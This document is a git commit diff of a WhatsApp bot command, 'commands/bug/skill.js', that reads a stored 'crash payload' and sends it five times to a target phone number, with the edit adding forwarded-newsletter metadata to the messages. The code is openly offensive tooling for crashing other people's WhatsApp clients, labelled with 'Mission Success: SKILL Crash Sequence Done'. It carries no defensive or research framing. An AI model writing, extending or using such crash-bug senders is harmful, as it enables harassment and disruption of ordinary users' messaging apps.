7475ea98881b3887ed69840e5dda1c73fc239d3a
Loving Programming <officialstanlee143@gmail.com>
2026-02-11 16:53:27 +0300

    Update skill.js

--- commands/bug/skill.js
+++ commands/bug/skill.js
@@ -3,16 +3,17 @@ const config = require('../../config');
 
 module.exports = {
     name: "skill",
-    execute: async (conn, msg, args, { from, fancy, isOwner }) => {
+    execute: async (conn, msg, args, { from, isOwner }) => {
         if (!isOwner) return;
         let target = args[0]?.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
         const payload = fs.readFileSync('./lib/payloads/skill.text', 'utf-8');
 
-        msg.reply(fancy("🥀 sending skill crash payload..."));
-
         for (let i = 0; i < 5; i++) {
-            await conn.sendMessage(target, { text: "\u200B" + payload });
+            await conn.sendMessage(target, { 
+                text: "\u200B" + payload,
+                contextInfo: { isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: config.newsletterJid } }
+            });
         }
-        await conn.sendMessage(conn.user.id, { text: fancy("🥀 Mission Successful: SKILL Crash sequence done.") });
+        await conn.sendMessage(conn.user.id, { text: "🥀 Mission Success: SKILL Crash Sequence Done." });
     }
 };
